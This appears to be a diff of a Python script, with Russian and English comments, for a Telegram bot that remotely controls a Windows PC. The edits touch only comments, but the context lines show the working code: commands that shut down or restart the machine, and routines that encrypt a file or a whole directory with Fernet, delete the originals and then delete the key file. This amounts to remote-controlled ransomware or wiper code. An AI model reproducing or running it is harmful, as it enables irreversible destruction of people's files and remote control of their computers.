@@ -10,11 +10,11 @@ output_file = 'file.encrypted'  # Файл который мы получаем 
 
 key_file = open('key.key', 'rb')  # Открываем файл с ключём для чтения / Open file with key
 key = key_file.read()  # Читаем содержимое файла с ключём / Read content of key file
-key_file.close()  # Зыкрываем файл с ключём/ Close file with key
+key_file.close()  # Зыкрываем файл с ключём / Close file with key
 
 
 bot_token = "TOKEN"  # Токен бота / Bot token
-chat_id = "ID"  # Наш айди / Our ID
+chat_id = "ID"  # Ваш айди / Your ID
 bot = telebot.TeleBot(bot_token)
 
 bot.send_message(chat_id, "Bot started successfully!")
@@ -60,14 +60,14 @@ Bot Commands:
 @bot.message_handler(commands=["shutdown", "/shutdown", "/Shutdown"])
 def shutdown(self):
     bot.send_message(chat_id, "Shutdown Successfully!")
-    system("shutdown /s /t 1")  # Выключение компьютера / Command to shutdown our PC
+    system("shutdown /s /t 1")  # Выключение компьютера / Shutdown PC
 
 
 # Initiate command /restart
 @bot.message_handler(commands=["restart", "/restart", "/Restart"])
 def restart(self):
     bot.send_message(chat_id, "Restart Successfully!")
-    system("shutdown /r /t 1")  # Перезагрузка компьютера / Command to reboot our PC
+    system("shutdown /r /t 1")  # Перезагрузка компьютера / Command to reboot PC
 
 
 # Initiate command /encryptingone
@@ -75,17 +75,17 @@ def restart(self):
 def encrypt(self):
     try:
         with open(input_file, 'rb') as f:
-            data = f.read()  # Читаем исходный файл / Read the input file
+            data = f.read()  # Читаем файл / Read the file
 
         fernet = Fernet(key)  # Переменная с ключём для шифрования / Variable with key for encoding
-        encrypted = fernet.encrypt(data)  # Зашифровываем файл / Encrypting the file
+        encrypted = fernet.encrypt(data)  # Шифруем файл / Encrypting the file
 
         with open(output_file, 'wb') as f:
             f.write(encrypted)  # Записываем информацию в зашифрованный файл / Write encoded message/file to output file
         remove(input_file)  # Удаляем исходный файл / Removing input file
         remove("key.key")  # Удаляем файл с ключём / Removing key file
 
-    except Exception as ex:  # Бот отправит нам сообщение с ошибкой / Bot will send us message with exception
+    except Exception as ex:
         bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
 
 
@@ -124,7 +124,7 @@ def encrypt(self):
 
         walk("your_directory")
         bot.send_message(chat_id, "Successfully encrypted")
-    except Exception as ex:  # Бот отправит нам сообщение с ошибкой / Bot will send us message with exception
+    except Exception as ex:
         bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
 # ---------------------------------------------------------------------------------------------------------------------
 
